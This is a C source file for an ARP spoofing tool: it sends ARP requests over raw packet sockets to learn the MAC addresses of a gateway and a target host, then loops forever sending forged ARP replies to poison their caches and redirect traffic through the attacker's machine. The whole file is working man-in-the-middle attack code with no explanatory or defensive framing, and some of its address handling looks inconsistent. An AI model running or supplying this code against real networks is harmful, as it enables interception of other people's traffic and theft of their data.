#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include "headers.h"
#include "inject_new.h"
#include "utils.h"

int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, const char *own_mac, char *ifname) {
    
    uint32_t my_ip;
    uint8_t my_mac[6];
    char *interface = ifname;
    uint32_t target_ip_one;
    uint32_t target_ip_two;
    struct in_addr ip_addr = {0};
    printf("Initializing inject\n");
    
    // Convert IP address strings to numerical form
    printf("Target IP one: %s\n", gateway_ip);
    printf("Target IP two: %s\n", target_ip);
    /* 
    target_ip_one = (uint32_t)inet_addr(gateway_ip);
    target_ip_two = (uint32_t)inet_addr(target_ip);
    my_ip = (uint32_t)inet_addr(target_ip);
    */
    if (!inet_aton(target_ip, &ip_addr))
        perror("Error in inet_aton()");
    target_ip_one = ip_addr.s_addr;
    
    if (!inet_aton(gateway_ip, &ip_addr))
        perror("Error in inet_aton()");
    target_ip_two = ip_addr.s_addr;
    
    if (!inet_aton(own_ip, &ip_addr))
        perror("Error in inet_aton()");
    my_ip = ip_addr.s_addr;
     
    // Convert own mac to numerical form
    str_to_mac(own_mac, my_mac);
    
    printf("finding MAC addresses of targets\n");
    
    // Given the two IP addresses, find out the MAC addresses   
    struct arp_header arp_hdr; 
    get_mac_addr(target_ip_one, my_ip, my_mac, interface, &arp_hdr);
    
    uint8_t mac_addr_one[MAC_LEN];
    memcpy(mac_addr_one, arp_hdr.sha, MAC_LEN); 

    printf("MAC addresses found: %02x:%02x:%02x:%02x:%02x:%02x\n", 
            mac_addr_one[0], mac_addr_one[1], mac_addr_one[2], mac_addr_one[3],
            mac_addr_one[4], mac_addr_one[5]);
    
    get_mac_addr(target_ip_two, my_ip, my_mac, interface, &arp_hdr);
    
    uint8_t mac_addr_two[MAC_LEN];
    memcpy(mac_addr_two, arp_hdr.sha, MAC_LEN); 
   
    printf("MAC addresses found: %02x:%02x:%02x:%02x:%02x:%02x\n", 
            mac_addr_two[0], mac_addr_two[1], mac_addr_two[2], mac_addr_two[3],
            mac_addr_two[4], mac_addr_two[5]);
    

    // Construct ARP Packets for spoofing
    
    printf("Starting spoofing\n");
    while (1) {
        arp_spoof(mac_addr_one, my_mac, my_ip, target_ip_one, ifname);
        arp_spoof(mac_addr_two, my_mac, my_ip, target_ip_one, ifname);
        sleep(2);
    }    
    return 0;
}

void get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifname, 
                  struct arp_header *arp_hdr) {
    
    int sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    if (sock == -1) {
        perror("Error: socket()");
        exit(1);
    }
    
    const uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    struct ifreq ifr;
    set_ifr(sock, &ifr, ifname);    
    
    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = MAC_LEN;
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, broadcast_mac, MAC_LEN);
    
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl() failed");
        exit(1);
    }
    if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
        perror("Wrong hardware family");
        exit(1);
    }

    arp_hdr->hardware_type = htons(ARPHRD_ETHER);
    arp_hdr->protocol_type = htons(ETH_P_IP);
    arp_hdr->hardware_size = MAC_LEN;
    arp_hdr->protocol_size = IP_LEN;
    arp_hdr->opcode = htons(ARPOP_REQUEST);         // ARP_REQUEST = 1, ARP_REPLY = 2
    
    memset(&arp_hdr->tha, 0, MAC_LEN);
    memcpy(&arp_hdr->sha, (unsigned char *)ifr.ifr_hwaddr.sa_data, MAC_LEN);
    memcpy(&arp_hdr->spa, (unsigned char *)ifr.ifr_addr.sa_data + 2, IP_LEN);
    memcpy(&arp_hdr->tpa, &target_ip, IP_LEN);

    int bytes_sent = sendto(sock, arp_hdr, ARP_HDR_LEN, 0, (struct sockaddr *)&addr, sizeof(addr));
    if (bytes_sent < 0) {
        perror("sendto() failed");
        exit(1);
    }
    
    while (1) {
        int bytes_recvd = recv(sock, arp_hdr, ARP_HDR_LEN, 0); // 0, Null, Null
        if (bytes_recvd < 0) {
            perror("recvfrom() failed");
            exit(1);
        }

        if (bytes_recvd == 0)
           continue; 
        
        uint32_t from_addr = (arp_hdr->spa[3] << 24)
                           | (arp_hdr->spa[2] << 16)
                           | (arp_hdr->spa[1] << 8)
                           | (arp_hdr->spa[0] << 0);
        
        if (from_addr != target_ip)
            continue;
        
        if (ntohs(arp_hdr->opcode) == ARPOP_REPLY) { 
            break;
        }
    }
    close(sock);
}

void arp_spoof(uint8_t *target_mac, uint8_t *own_mac, uint32_t own_ip, uint32_t target_ip, char *ifname) {

    int sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    if (sock == -1) {
        perror("Error: socket()");
        exit(1);
    }
    
    struct arp_header arp_hdr;
    struct ifreq ifr;
    
    set_ifr(sock, &ifr, ifname);    
    
    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = MAC_LEN;
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, target_mac, MAC_LEN);
    
    arp_hdr.hardware_type = htons(ARPHRD_ETHER);
    arp_hdr.protocol_type = htons(ETH_P_IP);
    arp_hdr.hardware_size = MAC_LEN;
    arp_hdr.protocol_size = IP_LEN;
    arp_hdr.opcode = htons(ARPOP_REPLY); 
    
    memcpy(&arp_hdr.sha, own_mac, MAC_LEN);
    memcpy(&arp_hdr.spa, &own_ip, IP_LEN);
    memcpy(&arp_hdr.tha, target_mac, MAC_LEN);
    memcpy(&arp_hdr.tpa, &target_ip, IP_LEN);
    
    if (sendto(sock, &arp_hdr, sizeof(struct arp_header), 0, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        perror("sendto() failed");
        exit(1);
    }
}

void set_ifr(int sd, struct ifreq *ifr, char *ifname) {

    int name_len = strlen(ifname); 
    if (name_len < sizeof(ifr->ifr_name)) {
        memcpy(ifr->ifr_name, ifname, name_len);
        ifr->ifr_name[name_len] = 0;
    } else {
        perror("Interface name is too long");
        exit(1);
    }
    
    if (ioctl(sd, SIOCGIFINDEX, ifr) == -1) {
        fprintf(stderr, "ioctl: flags %d errno %d/%s\n", SIOCGIFINDEX, errno, strerror(errno));
        perror("Error in ioctl()");
        exit(1);
    }
}

